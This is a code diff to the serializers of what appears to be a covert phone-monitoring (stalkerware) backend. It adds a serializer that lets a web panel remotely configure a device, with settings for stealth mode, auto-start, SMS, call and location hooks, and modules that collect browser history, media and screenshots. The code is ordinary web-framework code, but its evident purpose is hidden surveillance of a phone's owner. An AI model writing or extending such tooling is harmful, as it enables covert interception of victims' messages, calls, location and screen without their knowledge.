@@ -4,7 +4,7 @@ API Serializers
 @version 1.0.0
 """
 from rest_framework import serializers
-from apps.devices.models import Device
+from apps.devices.models import Device, DeviceSettings
 from apps.monitoring_sms.models import SmsMessage
 from apps.monitoring_calls.models import CallLog
 from apps.monitoring_location.models import Location
@@ -138,3 +138,38 @@ class ScreenshotSerializer(serializers.ModelSerializer):
     def create(self, validated_data):
         device = self.context['request'].device
         return Screenshot.objects.create(device=device, **validated_data)
+
+
+class DeviceSettingsSerializer(serializers.ModelSerializer):
+    """
+    Device Settings Serializer
+    For remote control of device configuration from WebApp
+    """
+
+    class Meta:
+        model = DeviceSettings
+        fields = [
+            'api_base_url',
+            'wss_base_url',
+            'stealth_mode_enabled',
+            'auto_start_enabled',
+            'sms_hook_enabled',
+            'call_hook_enabled',
+            'location_hook_enabled',
+            'module_sms_enabled',
+            'module_calls_enabled',
+            'module_location_enabled',
+            'module_apps_enabled',
+            'module_browser_enabled',
+            'module_media_enabled',
+            'module_screenshots_enabled',
+            'sync_interval_minutes',
+            'settings_version',
+            'updated_at'
+        ]
+        read_only_fields = ['settings_version', 'updated_at']
+
+    def update(self, instance, validated_data):
+        # Increment version on each update
+        instance.settings_version += 1
+        return super().update(instance, validated_data)
